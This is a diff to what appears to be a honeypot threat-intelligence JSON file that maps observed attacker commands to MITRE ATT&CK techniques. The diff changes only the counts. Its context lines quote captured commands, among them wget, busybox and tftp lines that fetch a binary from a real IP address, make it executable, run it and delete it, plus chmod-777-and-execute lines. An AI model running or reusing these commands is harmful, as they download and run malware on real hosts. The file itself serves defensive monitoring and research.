@@ -8,7 +8,7 @@
         "stealth"
       ],
       "url": "https://attack.mitre.org/techniques/T1027",
-      "count": 79189,
+      "count": 79197,
       "distinct_ips": 339,
       "examples": [
         "echo -e \"\\x47\\x41\\x59\\x46\\x47\\x54\"",
@@ -25,8 +25,8 @@
         "defense-impairment"
       ],
       "url": "https://attack.mitre.org/techniques/T1222/002",
-      "count": 6351,
-      "distinct_ips": 388,
+      "count": 6377,
+      "distinct_ips": 389,
       "examples": [
         ">/tmp/d && chmod 777 /tmp/d && /tmp/d && cd /tmp/",
         ">/var/d && chmod 777 /var/d && /var/d && cd /var/",
@@ -42,8 +42,8 @@
         "command-and-control"
       ],
       "url": "https://attack.mitre.org/techniques/T1105",
-      "count": 2422,
-      "distinct_ips": 362,
+      "count": 2436,
+      "distinct_ips": 363,
       "examples": [
         "(wget http://185.93.89.72/wget -O- || busybox wget http://185.93.89.72/wget -O-) > w; chmod 777 w; ./w; rm -rf w",
         "(tftp -g 185.93.89.72 -r tftp -l- || busybox tftp -g 185.93.89.72 -r tftp -l-) > t; chmod 777 t; ./t; rm -rf t",
@@ -183,6 +183,6 @@
       ]
     }
   ],
-  "total_commands": 273013,
-  "matched_commands": 86328
+  "total_commands": 273208,
+  "matched_commands": 86362
 }
